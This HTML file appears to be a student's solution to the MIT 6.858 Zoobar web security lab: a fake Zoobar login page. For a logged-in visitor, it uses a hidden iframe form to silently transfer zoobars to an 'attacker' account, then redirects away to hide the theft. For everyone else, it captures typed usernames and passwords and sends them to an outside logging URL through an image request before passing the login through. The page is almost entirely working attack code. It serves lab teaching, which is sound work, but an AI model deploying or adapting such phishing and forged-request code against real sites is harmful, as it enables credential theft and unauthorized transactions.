<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
  <title>
    Login
  </title>
</head>

<body>
  <h1><a href="http://localhost:8080/zoobar/index.cgi/">Zoobar Foundation for Inquisitive
      Thinking</a></h1>
  <h2>Supporting the Inquisitive
    thinkers of the 21st-century</h2>
  <div id="login" class="centerpiece">
    <!--create form to transfer zoobars via iframe if user is logged in-->
    <iframe id="transfer_iframe" name="transfer_iframe" style="display:none"></iframe>
    <form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer"
      target="transfer_iframe" style="display:none">
      <input name="zoobars" type="text" , value=10>
      <input name="recipient" type="text" , value="attacker">
      <input type="submit" name="submission" value="Send">
    </form>
    <!--see if myZoobars if updated when zoobarjs script is run; if so, user is logged in-->
    <div id="myZoobars" style="display:none">-1</div>
    <script id="zoobarjs" type="text/javascript" src="http://localhost:8080/zoobar/index.cgi/zoobarjs"></script>
    <script>
      if (document.getElementById("myZoobars").innerHTML != -1) {
        // steal zoobars by submitting form
        document.transferform.submission.click();
        // redirect to another page to mask stealing of zoobars
        setTimeout(function () { location.href = 'https://css.csail.mit.edu/6.858/2022/'; }, 1000);
      }
    </script>
    <!--form to login, only gets to this point if user is not logged in-->
    <form id="form" name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login">
      <table>
        <tr>
          <td>Username:</td>
          <td><input type="text" name="login_username" size="20" autocomplete="no" value=""></td>
        </tr>
        <tr>
          <td>Password:</td>
          <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
            <input type="submit" name="submit_login" value="Log in">
            <input type="submit" name="submit_registration" value="Register">
          </td>
        </tr>
      </table>
      <input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/">
    </form>
    <!--if login or registration form button is clicked, then send username and password 
    to attacker's log and redirect to real website-->
    <script>
      function logLogin(event) {
        var payload = encodeURIComponent(
          document.loginform.login_username.value
          + "/"
          + document.loginform.login_password.value);
        var url = "https://css.csail.mit.edu/6.858/2022/labs/log.php?id=friedchicken&payload="
          + payload
          + "&random="
          + Math.random();
        (new Image()).src = url;
        event.preventDefault();
        setTimeout(function () { document.loginform.submit_login.click(); }, 1000);
        document.loginform.submit_login.removeEventListener("click", logLogin);
      }

      function logRegistration(event) {
        var payload = encodeURIComponent(
          document.loginform.login_username.value
          + "/"
          + document.loginform.login_password.value);
        var url = "https://css.csail.mit.edu/6.858/2022/labs/log.php?id=friedchicken&payload="
          + payload
          + "&random="
          + Math.random();
        (new Image()).src = url;
        event.preventDefault();
        setTimeout(function () { document.loginform.submit_registration.click(); }, 1000);
        document.loginform.submit_registration.removeEventListener("click", logRegistration);
      }
      document.loginform.submit_login.addEventListener("click", logLogin);
      document.loginform.submit_registration.addEventListener("click", logRegistration);
    </script>

  </div>
  <div class="footer warning">
  </div>
  <script>document.loginform.login_username.focus();</script>
</body>

</html>